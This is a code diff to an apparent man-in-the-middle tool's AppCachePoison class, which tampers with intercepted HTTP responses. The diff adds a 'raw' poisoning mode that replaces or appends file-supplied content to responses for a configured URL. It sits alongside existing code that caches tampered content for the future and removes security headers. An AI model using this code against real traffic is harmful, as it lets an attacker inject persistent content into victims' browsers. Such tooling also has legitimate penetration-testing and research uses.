@@ -71,6 +71,20 @@ class AppCachePoison(DummyResponseTamperer):
           data = self.getSpoofedManifest(url, s)
           headers.setRawHeaders("Content-Type", ["text/cache-manifest"])
 
+        elif element == "raw": # raw resource to modify, it does not have to be html
+          logging.log(logging.WARNING, "Poisoning raw URL")
+          if os.path.exists(p + '.replace'): # replace whole content
+            f = open(p + '.replace','r')
+            data = self.decorate(f.read(), s)
+            f.close()
+
+          elif os.path.exists(p + '.append'): # append file to body
+            f = open(p + '.append','r')
+            appendix = self.decorate(f.read(), s)
+            f.close()
+            # append to response body
+            data += appendix
+        
         self.cacheForFuture(headers)
         self.removeDangerousHeaders(headers)
         return data
@@ -141,19 +155,21 @@ class AppCachePoison(DummyResponseTamperer):
           return self.config['templates_path'] + '/default'
 
     def getManifestUrl(self, section):
-      return section["manifest_url"]
+      return section.get("manifest_url",'/robots.txt')
 
     def getSectionForUrls(self, urls):
         for url in urls:
             for i in self.config:
               if isinstance(self.config[i], dict): #section
                 section = self.config[i]
-                if section.has_key('tamper_url') and section['tamper_url'] == url:
+                if section.get('tamper_url',False) == url:
                   return (section, 'tamper',url)
                 if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
                   return (section, 'tamper',url)
-                if section.has_key('manifest_url') and section['manifest_url'] == url:
+                if section.get('manifest_url',False) == url:
                   return (section, 'manifest',url)
+                if section.get('raw_url',False) == url:
+                  return (section, 'raw',url)
 
         return (False,'',urls.copy().pop())
 
